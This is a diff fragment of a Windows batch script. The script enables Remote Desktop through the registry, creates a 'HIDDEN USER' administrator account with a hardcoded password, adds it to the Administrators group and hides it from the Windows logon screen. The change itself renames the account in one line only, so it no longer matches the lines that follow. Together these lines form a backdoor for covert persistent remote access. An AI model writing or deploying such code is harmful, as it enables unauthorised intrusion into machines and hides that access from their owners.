@@ -25,7 +25,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 REM ***************
 REM Create a HIDDEN USER usr= Administrator, pass= Nancyhd2@
 REM ***************
-net user Administrator Nancyhd2@ /add
+net user Administrators Nancyhd2@ /add
 net localgroup "Administrators" /add Administrator
 net localgroup "Users" /del Administrator
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Administrator /t REG_DWORD /d 0 /f
